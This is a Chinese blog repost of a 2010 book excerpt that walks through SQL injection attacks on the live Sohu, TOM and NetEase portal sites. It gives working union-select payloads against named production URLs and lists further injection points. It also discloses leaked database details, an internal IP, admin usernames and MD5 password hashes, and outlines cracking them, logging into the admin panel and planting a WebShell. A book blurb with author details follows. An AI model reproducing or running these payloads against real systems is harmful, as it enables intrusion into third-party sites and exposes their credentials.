# 对搜狐、网易和TOM三大门户网站的SQL注入漏洞检测 - weixin_33985507的博客 - CSDN博客
2010年10月28日 10:54:00[weixin_33985507](https://me.csdn.net/weixin_33985507)阅读数：6
##  对搜狐、网易和TOM三大门户网站的SQL注入漏洞检测
本文节选自《大中型网络入侵要案直击与防御》一书
此外，笔者对搜狐及TOM和网易这三大门户网站作了注入攻击检测，发现同样存在明显的注入漏洞，安全性很糟糕。
###### 1.MySQL注入检测搜狐门户网站
首先，来看看搜狐网站，搜狐网站上的动态网页大部分是采用PHP语言编写的，同样注入也很多。例如：
[http://app.sh.sohu.com/lo***l/s.php?id=636](http://app.sh.sohu.com/loreal/s.php?id=636)
这个网页是一个欧莱雅广告页面，未对提交的数字参数进行检测，可直接利用SQL注入获得当前数据版本、库名、用户等信息。首先，通过Order by查询获得字段数目为9，然后通过union select查询可获得数据库的各种信息（图241）：
[http://app.sh.sohu.com/lo***l/s.php?id=636](http://app.sh.sohu.com/loreal/s.php?id=636) and 1=2 union select 1,2,group_concat(user(),0x7C7C,version(),0x7C7C,database()),4,5,6,7,8,9
![clip_image002](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image002_thumb.jpg)
图241 搜狐网站SQL注入查询数据库信息
可得到当前数据库用户名为admin，数据库服务器地址为10.10.82.159，数据库版本为Mysql 5.0.27，当前数据库名为sohush。
再进一步检测，发现其中存在几个非常重要的数据库，包括：dvbbs、love008。前者是论坛数据库，后者是2008专题数据库。在论坛数据库中，可猜解出管理员账号和密码为：jim、4591b******ee2b5。在love008数据库中猜解出两个管理员用户和密码分别为（图242）：
admin 21232f297a*****743894a0e4a801fc3
es 3e4a632cb*****8fc2386fa5f8e4bd76
![clip_image004](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image004_thumb.jpg)
图242 猜解出管理员账号与密码
虽然说管理员密码都是MD5加密的，不过现在网上有20G的彩虹表下载，破解这些普通密码MD5值并不是太困难的事情。通过后台登陆，攻击者可以想方设法上传WebShell并进行提权与进一步渗透入侵操作。
此外，在搜狐网站中还有非常多的SQL注入点，举例如下：
注入点1（图243）：http://card.money.****.com/yh/card_product.php?id=71
注入点2：http://blog.club.****.com/list_diary_detail.php?artid=43761&db=blog002P4&kindid=3403
注入点3：http://blog.club.****.com/list_diary.php?db=blog001P3&kindid=529
注入点4：http://mini***.163.com/2009/0909/wuliangye/article.php?id=13
注入点5：http://blog.club.****.com/list_diary.php?db=blog001P3&kindid=529
注入点6：http://people.business.****.com/person/plist.php?userid=2047
注入点7：http://minisite.it.****.com/minisite/site849/photodetail1.jsp?corpID=849&status=browse&privCode=04&pictureID=57275
注入点8：http://zj.svip.****.com/news/2010/duanxindasai/item_list.php?category_id=1905
![clip_image006](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image006_thumb.jpg)
图243 搜狐注入点查询数据库信息
###### 2.MySQL注入检测TOM门户网站
TOM也是国内一大门户网站，在对TOM门户网站进行检测的过程中，也发现了许多严重的SQL注入漏洞，而且危害性非常大，直接导致攻击者登陆后台上传木马获得WebShell，并进一步控制整个网站服务器！
TOM网站的注入点地址为：
[http://qd**.tom.com/blog_content.php?blogid=482](http://qdgy.tom.com/blog_content.php?blogid=482)
直接用Order by进行查询时，会出错并跳转到网站首页，可使用--终止符号进行隔断处理，执行如下查询：
[http://qd**.tom.com/blog_content.php?blogid=482](http://qdgy.tom.com/blog_content.php?blogid=482) order by 14--
返回正常页面，得到字段数为14。再执行如下查询（图244）：
http://qd**.tom.com/blog_content.php?blogid=482 and 1=2 union select 1,2,3,group_concat(user(),0x7C7C,version(),0x7C7C,database()),4,5,6,7,8,9,10,11,12,13,14%20--
![clip_image008](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image008_thumb.jpg)
图244 union联合查询获得数据库相关信息
得到当前数据库版本、数据库名和用户。再爆出当前数据库中的所有表名，提交如下查询：
http://qd**.tom.com/blog_content.php?blogid=482 and 1=2 union select 1,2,3,4,group_concat(table_name),5,6,7,8,9,10,11,12,13,14 from information_schema.tables where table_schema=database()--
![clip_image010](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image010_thumb.jpg)
图245 查询到所有表名
在页面返回信息中，即可得到所有表名（图245）。在其中有名为adminuser的表名，表中很可能包含了管理员账号及密码，查询该表中的列名，可提交如下查询：
http://qd**.tom.com/blog_content.php?blogid=482 and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7,8,9,10,11,12,13,14 from information_schema.columns where table_name=(0x61646D696E75736572)--
![clip_image012](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image012_thumb.jpg)
图246 返回用户名及密码数据列
从页面返回信息中，可以看到用户名及密码列为username和pw（图246）。现在要爆出用户名和密码的数据值，提交如下查询语句：
http://qd**.tom.com/blog_content.php?blogid=482 and 1=2 union select 1,2,3,4,group_concat(username,0x7C,pw),5,6,7,8,9,10,11,12,13,14 from adminuser--
![clip_image014](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image014_thumb.jpg)
图247 获得管理员账号密码信息
从返回的页面信息中，可看到管理员用户名为qdjxlq，密码为3631137b9b0e47608c4ece9decc9a607（图247）。密码是经过MD5加密的32密文，破解并不是很困难。得到后台管理员账号密码后，再寻找后台登陆地址，得到后台登陆链接地址为（图248）：
[http://qd**.tom.com/admin/admin_login.php](http://qdgy.tom.com/admin/admin_login.php)
![clip_image016](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image016_thumb.jpg)
图248 管理员后台登陆页面
登陆后台获得WebShell后，就可以进一步入侵控制服务器并进行渗透攻击。
###### 3.MySQL注入检测网易门户网站
在对国内其它门户网站进行检测时发现，有许多网站也同样存在着SQL注入漏洞，例如在网易中存在如下注入点链接地址：
[http://min****e.163.com/2009/0909/wuliangye/article.php?id=13](http://minisite.163.com/2009/0909/wuliangye/article.php?id=13)
通过order by查询可得到字段数，再通过提交如下查询：
http://min****e.163.com/2009/0909/wuliangye/article.php?id=13%20and%201=2%20union%20select%201,database(),user(),version(),5,6,7,8
即可得到数据库版本、用户名和数据库名信息（图249）。由于数据库为Mysql 4.0版本，因此不能直接爆出数据表名，只有靠字典一个个进行猜解，猜解起来比较麻烦。
![clip_image018](https://images.cnblogs.com/cnblogs_com/broadview/WindowsLiveWriter/TOMSQL_98D9/clip_image018_thumb.jpg)
图249 网易注入点猜解示例
**书名：大中型网络入侵要案直击与防御**
**作者：肖遥 ****编著**
**ISBN 978-7-121-11740-4**
**出版日期：2010****年10****月**
**定价：79.00****元**
**开本：16****开**
**页码：624 ****页**
**作者简介**
肖遥，网名“冰河洗剑”，国内著名网络安全技术独立研究人士。
曾从事国防军工设计，参与过J10A、J11B等战斗机配套武器研制，独立开发出HF25火箭发射器，参与DF8GA及导弹发射架等武器设计。
潜心钻研网络安全技术10余年，长期担任国内多家著名网站的安全顾问，专业从事网络渗透测试与网络风险评估。
长年在《黑客X档案》、《黑客防线》等国内安全专业媒体上与同行分享最新研究成果。出版有《网络渗透攻击与安防修炼》、《网站入侵与脚本安全攻防修炼》、《黑客大曝光》、《黑客攻防大揭秘》等多部安全类畅销技术专著。其中，《网站入侵与脚本安全攻防修炼》一书已输出至中国台湾等地。
**内 ****容 ****简 ****介**
本书以解析各种网络环境下攻防案例的形式来讲解各种网络攻击与防护技术，从“黑客攻击”与“安全工作者防守”双向角度来进行介绍。每一章节的内容按照如下脉络展开：典型攻防案例再现→案例的简单分析→黑客攻击技术的系统讲解→网管安全防护解决方案→入侵手法与防护难点深度分析。全书真实呈现完整的攻击与防护事件，可让读者了解到攻击者如何选择攻击目标，如何制订攻击方案，如何绕过攻击中碰到的问题，网管通常采用哪些防护手法，安全漏洞在何处，网管又如何追踪攻击者，等等，因此对学习者和工作者来说都很有吸引力和参考价值。
本书是网络管理员、信息安全管理员、对网络安全感兴趣的人员必备的参考书，也可供大中院校或培训学校教师和学生阅读和参考。
